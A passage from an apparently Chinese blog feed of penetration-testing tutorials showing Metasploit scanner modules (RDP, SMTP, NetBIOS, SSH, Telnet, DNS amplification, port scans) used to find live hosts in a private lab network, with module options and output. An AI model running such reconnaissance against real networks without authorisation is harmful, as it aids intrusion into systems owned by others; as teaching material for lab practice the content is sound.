exploit</span><br></pre></td></tr></table></figure><p><img src="../do/media/d548820b5bbd229f26983633a4f94d79.jpg" alt></p><h3 id="十九：基于auxiliary-scanner-rdp-rdp-scanner发现内网存活主机"><a href="#十九：基于auxiliary-scanner-rdp-rdp-scanner发现内网存活主机" class="headerlink" title="十九：基于auxiliary/scanner/rdp/rdp_scanner发现内网存活主机"></a>十九：基于auxiliary/scanner/rdp/rdp_scanner发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/rdp/rdp_scanner) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/rdp/rdp_scanner): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">CredSSP true yes Whether or not to request CredSSP</span><br><span class="line">EarlyUser false yes Whether to support Earlier User Authorization Result PDU</span><br><span class="line">RHOSTS 192.168.1.2,115,119 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 3389 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TLS true yes Wheter or not request TLS security </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/rdp/rdp_scanner) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Scanned 1 of 3 hosts (33% complete)</span><br><span class="line">[+] 192.168.1.115:3389 ‐ Identified RDP</span><br><span class="line">[*] Scanned 2 of 3 hosts (66% complete)</span><br><span class="line">[+] 192.168.1.119:3389 ‐ Identified RDP</span><br><span class="line">[*] Scanned 3 of 3 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/57f3682a0f79fd561d1ad1f575943562.jpg" alt></p><h3 id="二十：基于auxiliary-scanner-smtp-smtp-version发现内网存活主机"><a href="#二十：基于auxiliary-scanner-smtp-smtp-version发现内网存活主机" class="headerlink" title="二十：基于auxiliary/scanner/smtp/smtp_version发现内网存活主机"></a>二十：基于auxiliary/scanner/smtp/smtp_version发现内网存活主机</h3><pre><code class="code">msf auxiliary(scanner/smtp/smtp_version) &gt; show options Module options (auxiliary/scanner/smtp/smtp_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐RHOSTS 192.168.1.5 yes The target address range or CIDR identifierRPORT 25 yes The target port (TCP)THREADS 50 yes The number of concurrent threadsmsf auxiliary(scanner/smtp/smtp_version) &gt; exploit</code></pre><p><img src="../do/media/e564a63c9072add70448d54da802de43.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>25、基于MSF发现内网存活主机第三季</title>
      <link href="/article/25_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%B8%89%E5%AD%A3.html"/>
      <url>/article/25_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%B8%89%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p><strong>攻击机：</strong><br>192.168.1.5 Debian<br><strong>靶机：</strong><br>192.168.1.2 Windows 7<br>192.168.1.115 Windows 2003<br>192.168.1.119 Windows 2003</p><p><strong>第一季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/discovery/arp_sweep </li><li>auxiliary/scanner/discovery/udp_sweep</li><li>auxiliary/scanner/ftp/ftp_version </li><li>auxiliary/scanner/http/http_version</li><li>auxiliary/scanner/smb/smb_version</li></ul><p><strong>第二季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/ssh/ssh_version </li><li>auxiliary/scanner/telnet/telnet_version</li><li>auxiliary/scanner/discovery/udp_probe </li><li>auxiliary/scanner/dns/dns_amp</li><li>auxiliary/scanner/mysql/mysql_version</li></ul><p><strong>第三季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/netbios/nbname </li><li>auxiliary/scanner/http/title</li><li>auxiliary/scanner/db2/db2_version </li><li>auxiliary/scanner/portscan/ack</li><li>auxiliary/scanner/portscan/tcp</li></ul><h3 id="十一：基于auxiliary-scanner-netbios-nbname发现内网存活主机"><a href="#十一：基于auxiliary-scanner-netbios-nbname发现内网存活主机" class="headerlink" title="十一：基于auxiliary/scanner/netbios/nbname发现内网存活主机"></a>十一：基于auxiliary/scanner/netbios/nbname发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/netbios/nbname) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/netbios/nbname): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">BATCHSIZE 256 yes The number of hosts to probe in each set</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 137 yes The target port (UDP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/netbios/nbname) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Sending NetBIOS requests to 192.168.1.0‐&gt;192.168.1.255 (256 hosts)</span><br><span class="line">[+] 192.168.1.2 [JOHN‐PC] OS:Windows Names:(JOHN‐PC, WORKGROUP, __MSBROWSE__) Addresses:(192.168.1.2, 192.168.163.1, 192.168.32.1)Mac:4c:cc:6a:e3:51:27</span><br><span class="line">[+] 192.168.1.115 [VM_2003X86] OS:Windows Names:(VM_2003X86,WORKGROUP) Addresses:(192.168.1.115) Mac:00:0c:29:af:ce:cc Virtual Machine:VMWare</span><br><span class="line">[+] 192.168.1.119 [WIN03X64] OS:Windows User:ADMINISTRATOR Names:(WIN03X64, WORKGROUP, ADMINISTRATOR) Addresses:(192.168.1.119)Mac:00:0c:29:85:d6:7d Virtual Machine:VMWare</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/a6a129d13e2d9bf59ea2604e2209c628.jpg" alt></p><h3 id="十二：基于auxiliary-scanner-http-title发现内网存活主机"><a href="#十二：基于auxiliary-scanner-http-title发现内网存活主机" class="headerlink" title="十二：基于auxiliary/scanner/http/title发现内网存活主机"></a>十二：基于auxiliary/scanner/http/title发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/http/title) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/http/title): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">Proxies no A proxy chain of format type:host:port[,type:host:port] [...]</span><br><span class="line">RHOSTS 192.168.1.115,119 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 80 yes The target port (TCP)</span><br><span class="line">SHOW_TITLES true yes Show the titles on the console as they are grabbed</span><br><span class="line">SSL false no Negotiate SSL/TLS for outgoing connections</span><br><span class="line">STORE_NOTES true yes Store the captured information in notes. Use &quot;no tes‐t http.title&quot; to view</span><br><span class="line">TARGETURI / yes The base path</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/http/title) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] [192.168.1.115:80] [C:200] [R:] [S:Microsoft‐IIS/6.0] 协同管理系统</span><br><span class="line">[*] Scanned 2 of 2 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/3b3bdcb6030f8589ccd496e6db60b078.jpg" alt></p><h3 id="十三：基于auxiliary-scanner-db2-db2-version发现db2服务"><a href="#十三：基于auxiliary-scanner-db2-db2-version发现db2服务" class="headerlink" title="十三：基于auxiliary/scanner/db2/db2_version发现db2服务"></a>十三：基于auxiliary/scanner/db2/db2_version发现db2服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/http/title) &gt; use auxiliary/scanner/db2/db2_version</span><br><span class="line">msf auxiliary(scanner/db2/db2_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/db2/db2_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DATABASE toolsdb yes The name of the target database</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 50000 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 5 yes Timeout for the DB2 probe </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/db2/db2_version) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="../do/media/e407db56cbad1474536c65e342335c2d.jpg" alt></p><h3 id="十四：基于auxiliary-scanner-portscan-ack发现内网存活主机"><a href="#十四：基于auxiliary-scanner-portscan-ack发现内网存活主机" class="headerlink" title="十四：基于auxiliary/scanner/portscan/ack发现内网存活主机"></a>十四：基于auxiliary/scanner/portscan/ack发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/portscan/ack) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/ack): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">BATCHSIZE 256 yes The number of hosts to scan per set</span><br><span class="line">DELAY 0 yes The delay between connections, per thread, in milliseconds</span><br><span class="line">INTERFACE no The name of the interface</span><br><span class="line">JITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.</span><br><span class="line">PORTS 445 yes Ports to scan (e.g. 22‐25,80,110‐900)</span><br><span class="line">RHOSTS 192.168.1.115,119 yes The target address range or CIDR identifier</span><br><span class="line">SNAPLEN 65535 yes The number of bytes to capture</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 500 yes The reply read timeout in milliseconds </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/ack) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] TCP UNFILTERED 192.168.1.115:445</span><br><span class="line">[*] TCP UNFILTERED 192.168.1.119:445</span><br><span class="line">[*] Scanned 2 of 2 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/fbdf74251216dac1ebff41389a22d608.jpg" alt></p><h3 id="十五：基于auxiliary-scanner-portscan-tcp发现内网存活主机"><a href="#十五：基于auxiliary-scanner-portscan-tcp发现内网存活主机" class="headerlink" title="十五：基于auxiliary/scanner/portscan/tcp发现内网存活主机"></a>十五：基于auxiliary/scanner/portscan/tcp发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">CONCURRENCY 10 yes The number of concurrent ports to check per host</span><br><span class="line">DELAY 0 yes The delay between connections, per thread, in milliseconds</span><br><span class="line">JITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.</span><br><span class="line">PORTS 445 yes Ports to scan (e.g. 22‐25,80,110‐900)</span><br><span class="line">RHOSTS 192.168.1.115,119,2 yes The target address range or CIDR identifier</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 1000 yes The socket connect timeout in milliseconds</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/tcp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.2: ‐ 192.168.1.2:445 ‐ TCP OPEN</span><br><span class="line">[*] Scanned 1 of 3 hosts (33% complete)</span><br><span class="line">[+] 192.168.1.119: ‐ 192.168.1.119:445 ‐ TCP OPEN</span><br><span class="line">[+] 192.168.1.115: ‐ 192.168.1.115:445 ‐ TCP OPEN</span><br><span class="line">[*] Scanned 3 of 3 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/44247b59b8adadc852f140fb1efde349.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>24、基于MSF发现内网存活主机第二季</title>
      <link href="/article/24_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%BA%8C%E5%AD%A3.html"/>
      <url>/article/24_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%BA%8C%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p><strong>攻击机：</strong><br>192.168.1.5 Debian</p><p><strong>靶机：</strong><br>192.168.1.2 Windows 7<br>192.168.1.115 Windows 2003<br>192.168.1.119 Windows 2003</p><p><strong>第一季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/discovery/arp_sweep </li><li>auxiliary/scanner/discovery/udp_sweep</li><li>auxiliary/scanner/ftp/ftp_version </li><li>auxiliary/scanner/http/http_version</li><li>auxiliary/scanner/smb/smb_version</li></ul><p><strong>第二季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/ssh/ssh_version </li><li>auxiliary/scanner/telnet/telnet_version</li><li>auxiliary/scanner/discovery/udp_probe </li><li>auxiliary/scanner/dns/dns_amp</li><li>auxiliary/scanner/mysql/mysql_version</li></ul><h3 id="六：基于auxiliary-scanner-ssh-ssh-version发现SSH服务"><a href="#六：基于auxiliary-scanner-ssh-ssh-version发现SSH服务" class="headerlink" title="六：基于auxiliary/scanner/ssh/ssh_version发现SSH服务"></a>六：基于auxiliary/scanner/ssh/ssh_version发现SSH服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 22 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 30 yes Timeout for the SSH probe </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.5:22 ‐ SSH server version: SSH‐2.0‐OpenSSH_7.9p1 Debian‐5 ( service.version=7.9p1 openssh.comment=Debian‐5 service.vendor=OpenBSD</span><br><span class="line">service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openb</span><br><span class="line">sd:openssh:7.9p1 os.vendor=Debian os.family=Linux os.product=Linux os.cpe</span><br><span class="line">23=cpe:/o:debian:debian_linux:‐ service.protocol=ssh fingerprint_db=ssh.banner )</span><br><span class="line">[*] Scanned 52 of 256 hosts (20% complete)</span><br><span class="line">[*] Scanned 95 of 256 hosts (37% complete)</span><br><span class="line">[*] Scanned 100 of 256 hosts (39% complete)</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] Scanned 131 of 256 hosts (51% complete)</span><br><span class="line">[*] Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] Scanned 206 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 235 of 256 hosts (91% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/807c52e59e46d0f2e9e95d01437eeb14.jpg" alt></p><h3 id="七：基于auxiliary-scanner-telnet-telnet-version发现TELNET服务"><a href="#七：基于auxiliary-scanner-telnet-telnet-version发现TELNET服务" class="headerlink" title="七：基于auxiliary/scanner/telnet/telnet_version发现TELNET服务"></a>七：基于auxiliary/scanner/telnet/telnet_version发现TELNET服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/telnet/telnet_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/telnet/telnet_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">PASSWORD no The password for the specified username</span><br><span class="line">RHOSTS 192.168.1.119 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 23 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 30 yes Timeout for the Telnet probe</span><br><span class="line">USERNAME no The username to authenticate as </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/telnet/telnet_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.119:23 ‐ 192.168.1.119:23 TELNET Welcome to Microsoft Telnet Service \x0a\x0a\x0dlogin:</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/c089625576a0bc03d7c27c5e8a29bf76.jpg" alt></p><h3 id="八：基于scanner-discovery-udp-probe发现内网存活主机"><a href="#八：基于scanner-discovery-udp-probe发现内网存活主机" class="headerlink" title="八：基于scanner/discovery/udp_probe发现内网存活主机"></a>八：基于scanner/discovery/udp_probe发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/discovery/udp_probe): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">CHOST no The local client address</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] Discovered NetBIOS on 192.168.1.2:137 (JOHN‐PC:&lt;00&gt;:U :WORKGROUP:</span><br><span class="line">&lt;00&gt;:G :JOHN‐PC:&lt;20&gt;:U :WORKGROUP:&lt;1e&gt;:G :WORKGROUP:&lt;1d&gt;:U</span><br><span class="line">:__MSBROWSE__ &lt;01&gt;:G :4c:cc:6a:e3:51:27)</span><br><span class="line">[+] Discovered DNS on 192.168.1.1:53 (de778500000100010000000007564552  53494f4e0442494e440000100003c00c0010000300000001001a19737572656c7920796f7</span><br><span class="line">5206d757374206265206a6f6b696e67)</span><br><span class="line">[*] Scanned 43 of 256 hosts (16% complete)</span><br><span class="line">[*] Scanned 52 of 256 hosts (20% complete)</span><br><span class="line">[*] Scanned 89 of 256 hosts (34% complete)</span><br><span class="line">[+] Discovered NetBIOS on 192.168.1.119:137 (WIN03X64:&lt;00&gt;:U :WIN03X64:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :WIN03X64:&lt;03&gt;:U</span><br><span class="line">:ADMINISTRA TOR:&lt;03&gt;:U :WIN03X64:&lt;01&gt;:U :00:0c:29:85:d6:7d)</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] Scanned 140 of 256 hosts (54% complete)</span><br><span class="line">[*] Scanned 163 of 256 hosts (63% complete)</span><br><span class="line">[*] Scanned 184 of 256 hosts (71% complete)</span><br><span class="line">[*] Scanned 212 of 256 hosts (82% complete)</span><br><span class="line">[*] Scanned 231 of 256 hosts (90% complete)</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/af10a3aff554c008158ff0e85b036489.jpg" alt></p><h3 id="九：基于auxiliary-scanner-dns-dns-amp发现内网存活主机"><a href="#九：基于auxiliary-scanner-dns-dns-amp发现内网存活主机" class="headerlink" title="九：基于auxiliary/scanner/dns/dns_amp发现内网存活主机"></a>九：基于auxiliary/scanner/dns/dns_amp发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/dns/dns_amp) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/dns/dns_amp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">BATCHSIZE 256 yes The number of hosts to probe in each set</span><br><span class="line">DOMAINNAME isc.org yes Domain to use for the DNS request</span><br><span class="line">FILTER no The filter string for capturing traffic</span><br><span class="line">INTERFACE no The name of the interface</span><br><span class="line">PCAPFILE no The name of the PCAP capture file to process</span><br><span class="line">QUERYTYPE ANY yes Query type(A, NS, SOA, MX, TXT, AAAA, RRSIG, DNSKEY, ANY)</span><br><span class="line">RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 53 yes The target port (UDP)</span><br><span class="line">SNAPLEN 65535 yes The number of bytes to capture</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 500 yes The number of seconds to wait for new data </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/dns/dns_amp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Sending DNS probes to 192.168.1.0‐&gt;192.168.1.255 (256 hosts)</span><br><span class="line">[*] Sending 67 bytes to each host using the IN ANY isc.org request</span><br><span class="line">[+] 192.168.1.1:53 ‐ Response is 530 bytes [7.91x Amplification]</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/3fc4759c9996757b077c7a33694e0dea.jpg" alt></p><h3 